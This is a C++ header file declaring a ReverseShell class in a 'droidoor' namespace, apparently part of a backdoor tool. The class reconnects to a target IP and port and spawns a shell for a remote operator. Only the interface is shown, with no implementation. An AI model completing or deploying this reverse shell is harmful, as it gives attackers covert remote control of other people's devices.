#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string>
#include <cstdint>
namespace droidoor {
class ReverseShell{
    private:
        uint32_t sock;
        struct sockaddr_in target_addr;
        std::string target_ip;
        uint16_t target_port;
        pid_t shell_pid;
        std::string msg;
        
        bool is_connected = false;
        bool is_shell_spawned = false;

        
        void reconnect();
    
        public:
            ReverseShell(const std::string& ip, uint16_t port);
            
            void setup_connect();
            void spawn_shell(const std::string& shell = "");
            void run();

            ~ReverseShell();
};
} // namespace droidoor